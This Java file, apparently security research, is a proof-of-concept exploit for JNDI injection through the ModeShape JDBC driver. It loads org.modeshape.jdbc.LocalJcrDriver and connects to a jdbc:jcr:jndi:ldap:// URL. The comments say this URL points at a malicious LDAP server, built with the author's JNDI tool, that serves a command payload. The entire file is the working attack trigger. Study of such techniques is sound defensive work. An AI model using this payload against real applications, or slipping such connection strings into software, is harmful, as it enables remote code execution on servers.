package org.su18.jdbc.attack.modeshape;

import java.sql.DriverManager;

/**
 * 使用 https://github.com/su18/JNDI 进行测试
 * 驱动名称 org.modeshape.jdbc.LocalJcrDriver
 * 属性名 jcr:jndi:
 * 连接参数 jdbc:jcr:jndi:ldap://127.0.0.1:23457/Command8
 *
 * @author su18
 */
public class AttackTest {

	public static void main(String[] args) throws Exception {
		// 注册驱动
		Class.forName("org.modeshape.jdbc.LocalJcrDriver");
		// jcr 协议支持
		DriverManager.getConnection("jdbc:jcr:jndi:ldap://127.0.0.1:23457/Command8");
	}

}
